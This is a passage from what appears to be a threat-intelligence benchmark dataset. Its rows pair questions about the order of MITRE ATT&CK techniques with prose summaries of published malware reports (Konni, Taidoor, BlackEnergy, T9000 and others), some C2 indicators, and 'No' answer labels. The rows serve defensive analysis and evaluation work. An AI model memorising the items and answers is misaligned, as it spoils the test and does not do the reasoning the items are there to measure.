Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",No
1530,366,2130-Persistence-T1547.006-Kernel Modules and Extensions,"After 'stopedge.bat' manages the deletion of files such as 'versioninfo.bat' and 'update.vbs' as a means of defense evasion, is it likely that persistence will be established by using kernel modules such as in the techniques employed by Drovorub or Skidmap?",Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.,"Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",No
1175,285,285-Initial Access-T1566-Phishing,"After enticing recipients through spear-phishing emails under the Reconnaissance tactic, is it likely that the Taidoor malware will execute beaconing communications using a consistent HTTP GET request pattern before exploiting a vulnerability in Microsoft Office to drop itself onto the target's system?","Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",No
420,103,35-Execution-T1059.001-PowerShell,"After using an email attachment and social engineering to prompt the target to execute a .src file for initial access, is it likely that the operator will utilize a PowerShell script such as TANKTRAP to spread and launch a wiper before achieving persistence by creating a Windows shortcut in the startup folder?",Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.,"Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",No
975,241,241-Initial Access-T1566-Phishing,Are Ukrainian and Polish state organizations and businesses likely to be targeted with BlackEnergy spear-phishing emails related to the current Ukrainian crisis only after the malware executes techniques for bypassing UAC and defeating the signed driver requirement for Defense Evasion?,Initial Access: A large number of state organizations and businesses from various industry fields in the Ukraine and Poland have been targeted in recent attacks. The most effective infection vectors appear to be spear-phishing emails with subjects related to the current Ukrainian crisis combined with the exploitation of MS Office documents. CVE-2014-1761 was also used to spread BlackEnergy.,"Defense Evasion: BlackEnergy is a trojan which has undergone significant functional changes since it was first publicly analyzed by Arbor Networks in 2007. It has evolved from a relatively simple DDoS trojan into a sophisticated piece of modern malware with a modular architecture. The malware includes techniques for bypassing UAC, defeating the signed driver requirement in Windows, and a selection of BlackEnergy2 plug-ins used for parasitic file infections, network discovery, remote code execution, and data collection.
Others: The most recent campaigns leveraging BlackEnergy are dated August 2014. The malware has been used for sending spam, online bank fraud, and targeted attacks. BlackEnergy version 2, which featured rootkit techniques, was documented by SecureWorks in 2010. The targeted attacks recently discovered are proof that the trojan is still active. The technical analysis of the BlackEnergy family focuses on novel functionality and the differences introduced by new 'lite' variants. The many targets in the Ukraine and Poland have been infected through several known and unknown infection vectors.",No
1656,391,2362-Execution-T1053.003-Cron,"After the FHAPPI campaign delivered an APT phishing email containing a link to malware hosted on a Geocities website and the VBScript downloaded and opened a .doc file leading to its execution, is it likely that the malware will install itself as a cron job using the cron utility instead of using PowerShell for further execution?","Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",No
1218,303,1594-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After T9000 steals sensitive data from Skype communications and removable drives during the collection phase, is it likely that the malware will exfiltrate collected data from the infected machine to the C2 using the MIME protocol?","Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",No
1160,282,1414-Initial Access-T1566.004-Spearphishing Voice,"Before CrateDepression drops Poseidon payloads via a malicious crate named 'rustdecimal,' is it likely that adversaries would impersonate legitimate IT personnel in phone calls to direct victims to download a remote monitoring tool for gaining initial access?","Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.","Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.
Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",No
